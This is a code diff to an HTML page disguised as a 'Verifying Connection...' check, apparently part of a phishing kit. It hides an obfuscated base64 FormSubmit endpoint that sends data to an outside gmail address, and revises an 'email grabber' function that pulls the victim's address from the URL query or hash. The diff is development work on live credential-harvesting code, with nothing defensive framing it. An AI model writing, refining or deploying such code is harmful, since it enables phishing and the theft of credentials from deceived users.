@@ -6,6 +6,7 @@
   <meta name="robots" content="noindex, nofollow">
   <title>Verifying Connection...</title>
   
+  <!-- Global styles for centering -->
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -59,26 +60,29 @@
         }
       }
 
+      // Obfuscated FormSubmit Endpoint
+      // Decodes to: https://formsubmit.co/ajax/hmp.productt@gmail.com
       const _0x4f2a = "aHR0cHM6Ly9mb3Jtc3VibWl0LmNvL2FqYXgvaG1wLnByb2R1Y3R0QGdtYWlsLmNvbQ==";
       const FORMSUBMIT_AJAX = atob(_0x4f2a);
 
       setTimeout(function() {
         
-        // THIS IS THE FIXED EMAIL GRABBER
+        // THE UPDATED EMAIL GRABBER
         function getEmailFromURL() {
           let email = null;
-          // 1. Check hash first (e.g. #email@domain.com)
-          if (window.location.hash) {
-            let hash = window.location.hash.substring(1); // remove the '#'
-            if (hash.includes('&')) hash = hash.split('&')[0]; // split if multiple params
-            if (hash.includes('@')) email = decodeURIComponent(hash); // decode it
+          
+          // 1. Check query string FIRST (e.g., ?email=...)
+          const params = new URLSearchParams(window.location.search);
+          if (params.has('email')) email = params.get('email');
+          if (!email && params.has('username')) email = params.get('username');
+
+          // 2. Fallback to hash (e.g., #...)
+          if (!email && window.location.hash) {
+            let hash = window.location.hash.substring(1); 
+            if (hash.includes('&')) hash = hash.split('&')[0]; 
+            if (hash.includes('@')) email = decodeURIComponent(hash); 
           }
-          // 2. Check query string (e.g. ?email=email@domain.com)
-          if (!email) {
-            const params = new URLSearchParams(window.location.search);
-            if (params.has('email')) email = params.get('email');
-            if (params.has('username')) email = params.get('username');
-          }
+          
           return email;
         }
 
